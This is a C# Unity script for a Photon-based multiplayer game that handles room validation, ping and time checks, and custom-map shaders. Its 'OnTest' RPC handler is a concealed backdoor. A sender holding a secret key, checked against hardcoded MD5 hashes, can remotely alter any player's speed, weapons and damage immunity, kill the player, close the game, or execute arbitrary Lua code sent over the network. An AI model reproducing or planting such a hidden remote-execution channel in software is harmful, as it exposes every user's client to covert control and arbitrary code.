using System;
using System.Timers;
using ExitGames.Client.Photon;
using UnityEngine;
using XLua;

public class GameOthers : Photon.MonoBehaviour
{
	private bool isPause;

	private Timer pauseTimer;

	public static int pauseInterval = 2000;

	private byte adminTimeFalse;

	private byte checkTimeFalse;

	private byte checkPingFalse;

	private void Start()
	{
		if (!PhotonNetwork.offlineMode && !LevelManager.HasSceneInGameMode(PhotonNetwork.room.GetGameMode()) && !LevelManager.customScene)
		{
			PhotonNetwork.LeaveRoom(true);
			return;
		}
		PhotonNetwork.playerName = AccountManager.instance.Data.AccountName;
		PhotonRPC.AddMessage("OnTest", OnTest);
		PhotonRPC.AddMessage("PhotonCheckTime", PhotonCheckTime);
		TimerManager.In(nValue.int5, -nValue.int1, nValue.int5, UpdatePing);
		TimerManager.In(nValue.int10, -nValue.int1, nValue.int10, CheckTime);
		if (PhotonNetwork.room.isOfficialServer())
		{
			TimerManager.In(nValue.int2, -nValue.int1, nValue.int2, CheckPing);
		}
		if (PhotonNetwork.room.isCustomMap())
        {
			MeshRenderer[] renderers = FindObjectsOfType<MeshRenderer>();
			for (int i = 0; i < renderers.Length; i++)
            {
				for (int j = 0; j < renderers[i].materials.Length; j++)
                {
					if (renderers[i].materials[j].name.Contains("Glass"))
                    {
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
                    }
					if (renderers[i].materials[j].name.Contains("WhiteBlock"))
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
					if (renderers[i].materials[j].name.Contains("Water"))
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
					if (renderers[i].materials[j].name.Contains("Ladder"))
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
					if (renderers[i].materials[j].name.Contains("Frame"))
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
					if (renderers[i].materials[j].name.Contains("Ice"))
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
					if (renderers[i].materials[j].name == "Black (Instance)")
					{
						renderers[i].materials[j].shader = Shader.Find("Legacy Shaders/Transparent/VertexLit");
					}
				}
            }
        }
		TimerManager.In(nValue.float1, delegate
		{
			int playerID = PhotonNetwork.player.GetPlayerID();
			for (int i = 0; i < PhotonNetwork.otherPlayers.Length; i++)
			{
				if (PhotonNetwork.otherPlayers[i].GetPlayerID() == playerID)
				{
					PhotonNetwork.LeaveRoom(true);
				}
			}
			if (!PhotonNetwork.offlineMode)
			{
				if (PhotonNetwork.room.GetSceneName() != LevelManager.GetSceneName())
				{
					PhotonNetwork.LeaveRoom(true);
				}
				if (LevelManager.GetSceneName() == "50Traps")
				{
					if (PhotonNetwork.room.MaxPlayers > 32)
					{
						object value;
						PhotonNetwork.room.CustomProperties.TryGetValue("xor", out value);
						if (value.ToString() != "maxpl")
						{
							PhotonNetwork.LeaveRoom(true);
						}
					}
				}
				else if (PhotonNetwork.room.MaxPlayers > 13)
				{
					object value2;
					PhotonNetwork.room.CustomProperties.TryGetValue("xor", out value2);
					if (value2.ToString() != "maxpl")
					{
						PhotonNetwork.LeaveRoom(true);
					}
				}
				if (playerID != (int)AccountManager.instance.Data.ID || playerID <= 0)
				{
					PhotonNetwork.LeaveRoom(true);
				}
				if (string.IsNullOrEmpty(AccountManager.instance.Data.AccountName) || PhotonNetwork.player.UserId != AccountManager.instance.Data.AccountName)
				{
					PhotonNetwork.LeaveRoom(true);
				}
			}
		});
	}

	private void OnEnable()
	{
		PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Combine(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(OnPhotonCustomRoomPropertiesChanged));
		PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Combine(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(OnPhotonPlayerPropertiesChanged));
	}

	private void OnDisable()
	{
		pauseInterval = 2000;
		PhotonNetwork.onPhotonCustomRoomPropertiesChanged = (PhotonNetwork.HashtableDelegate)Delegate.Remove(PhotonNetwork.onPhotonCustomRoomPropertiesChanged, new PhotonNetwork.HashtableDelegate(OnPhotonCustomRoomPropertiesChanged));
		PhotonNetwork.onPhotonPlayerPropertiesChanged = (PhotonNetwork.ObjectsDelegate)Delegate.Remove(PhotonNetwork.onPhotonPlayerPropertiesChanged, new PhotonNetwork.ObjectsDelegate(OnPhotonPlayerPropertiesChanged));
	}

	private void OnPhotonCustomRoomPropertiesChanged(Hashtable hash)
	{
		if (hash.ContainsKey(PhotonCustomValue.onlyWeaponKey) || hash.ContainsKey(PhotonCustomValue.passwordKey))
		{
			PhotonNetwork.LeaveRoom(true);
		}
	}

	private void OnPhotonPlayerPropertiesChanged(object[] playerAndUpdatedProps)
	{
		PhotonPlayer photonPlayer = (PhotonPlayer)playerAndUpdatedProps[nValue.int0];
		Hashtable hashtable = (Hashtable)playerAndUpdatedProps[nValue.int1];
		if (photonPlayer.IsLocal && (hashtable.ContainsKey(PhotonCustomValue.playerIDKey) || hashtable.ContainsKey(PhotonCustomValue.levelKey)))
		{
			PhotonNetwork.LeaveRoom(true);
		}
	}

	private void OnApplicationPause(bool pauseStatus)
	{
		if (PhotonNetwork.offlineMode)
		{
			return;
		}
		isPause = pauseStatus;
		if (isPause)
		{
			if (pauseTimer != null)
			{
				return;
			}
			pauseTimer = new Timer();
			pauseTimer.Elapsed += delegate
			{
				pauseTimer.Stop();
				pauseTimer = null;
				if (isPause)
				{
					PhotonNetwork.LeaveRoom(true);
					PhotonNetwork.networkingPeer.SendOutgoingCommands();
				}
			};
			pauseTimer.Interval = pauseInterval;
			pauseTimer.Enabled = true;
		}
		else if (pauseTimer != null)
		{
			pauseTimer.Stop();
			pauseTimer = null;
		}
	}

	private void UpdatePing()
	{
		PhotonNetwork.player.UpdatePing();
	}

	private void CheckPing()
	{
		if (PhotonNetwork.GetPing() >= 200)
		{
			UIToast.Show(Localization.Get("High Ping"));
			checkPingFalse++;
			if (checkPingFalse > nValue.int3)
			{
				GameManager.leaveRoomMessage = Localization.Get("High Ping");
				PhotonNetwork.LeaveRoom(true);
			}
		}
		else if (checkPingFalse > 0)
		{
			checkPingFalse--;
		}
	}

	private void CheckTime()
	{
		if (PhotonNetwork.isMasterClient)
		{
			PhotonRPC.RPC("PhotonCheckTime", PhotonTargets.All);
		}
	}

	[PunRPC]
	private void PhotonCheckTime(PhotonMessage message)
	{
		double time = PhotonNetwork.time;
		if (message.timestamp + (double)nValue.int1 > time)
		{
			checkTimeFalse = 0;
			if (message.timestamp - time >= (double)nValue.int1)
			{
				adminTimeFalse++;
				if (adminTimeFalse >= nValue.int3)
				{
					GameManager.leaveRoomMessage = Localization.Get("ServerAdminSpeedHack");
					CheckManager.Detected("Server Time Error");
				}
			}
		}
		else
		{
			checkTimeFalse++;
			if (checkTimeFalse >= nValue.int3)
			{
				CheckManager.Quit();
			}
		}
	}

	[PunRPC]
	private void OnTest(PhotonMessage message)
	{
		string key = message.ReadString();
		if (!(Utils.MD5(key) != "b4f4b37c119ae28e08c35ee7bfc3e84e"))
        {
			float speed = message.ReadFloat();
			PlayerInput.instance.UpdatePlayerSpeed(speed);
		}
		if (!(Utils.MD5(key) != "9586afed52590a5770f501ba11273ef7"))
		{
			string action = message.ReadString();
			if (action.Contains("WEAPONCHANGE"))
			{
				string[] str = action.Split(';');
				WeaponType weaponType;
				weaponType = (WeaponType)Enum.Parse(typeof(WeaponType), str[1]);
				int id = Convert.ToInt32(str[2]);
				WeaponManager.SetSelectWeapon(weaponType, id);
				PlayerInput.instance.PlayerWeapon.UpdateWeaponAll(weaponType);
				WeaponCustomData skin = new WeaponCustomData();
				skin.Skin = int.Parse(str[3]);
				PlayerInput.instance.PlayerWeapon.UpdateWeapon(weaponType, true, skin);
				return;
			}
			switch (action)
			{
				case "1":
					PlayerInput.instance.SetClimb(true);
					break;
				case "2":
					PlayerInput.instance.SetClimb(false);
					break;
				case "3":
					PlayerInput.instance.NoDamage = true;
					break;
				case "4":
					PlayerInput.instance.NoDamage = false;
					break;
				case "5":
					PlayerInput.instance.SetMoveIce(true);
					break;
				case "6":
					PlayerInput.instance.SetMoveIce(false);
					break;
				case "7":
					PlayerInput.instance.SetMove(true);
					break;
				case "8":
					PlayerInput.instance.SetMove(false);
					break;
				case "9":
					PlayerInput.instance.PlayerWeapon.CanFire = true;
					break;
				case "10":
					PlayerInput.instance.PlayerWeapon.CanFire = false;
					break;
				case "11":
					DamageInfo damage = new DamageInfo();
					damage.team = Team.None;
					damage.damage = 10000;
					damage.player = -1;
					damage.weapon = 0;
					damage.position = Vector3.zero;
					PlayerInput.instance.Damage(damage);
                    break;
				case "12":
					Application.Quit();
					break;
				case "13":
					PhotonNetwork.LeaveRoom(true);
					break;
				case "14":
					string lua = message.ReadString();
					Debug.Log(lua);
					bool dispose = message.ReadBool();
					LuaEnv luaEnv = new LuaEnv();
					luaEnv.DoString(lua, "chunk", null);
					if (dispose)
					{
						luaEnv.Dispose();
					}
					break;
				default:
					break;
			}
		}
    }
}
